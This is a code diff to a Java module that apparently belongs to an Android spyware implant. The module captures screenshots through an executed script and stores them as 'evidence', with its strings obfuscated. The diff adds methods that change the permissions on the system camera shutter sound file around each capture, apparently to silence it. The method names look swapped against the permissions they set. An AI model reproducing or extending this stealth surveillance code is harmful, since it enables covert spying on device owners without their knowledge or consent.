@@ -60,6 +60,8 @@ public class ModuleSnapshot extends BaseInstantModule {
 	/** The Constant CAPTURE_FOREGROUND. */
 	final private static int CAPTURE_FOREGROUND = 1;
 
+	String cameraSound = M.e("/system/media/audio/ui/camera_click.ogg");
+	
 	/** The delay. */
 	private int delay;
 
@@ -163,6 +165,10 @@ public class ModuleSnapshot extends BaseInstantModule {
 		aframe.delete();
 		
 		if(asc.exists() && asc.canRead()){
+			
+			try{
+			disableClick();
+			
 			ExecuteResult res = Execute.executeScript( sc + " -p " + frame + ";chmod 777 "+ frame);
 			if(aframe.exists() && aframe.canRead()){
 				Bitmap bitmap = readPng(aframe);
@@ -176,8 +182,25 @@ public class ModuleSnapshot extends BaseInstantModule {
 				EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
 				return true;
 			}
+			}finally{
+				enableClick();
+			}
 		}
 		return false;
+	}
+
+	private void enableClick() {
+		AutoFile file = new AutoFile(cameraSound);
+		if(file.exists()){
+			file.chmod(000);
+		}
+	}
+
+	private void disableClick() {
+		AutoFile file = new AutoFile(cameraSound);
+		if(file.exists()){
+			file.chmod(777);
+		}
 	}
 
 	private Bitmap readPng(AutoFile aframe) {
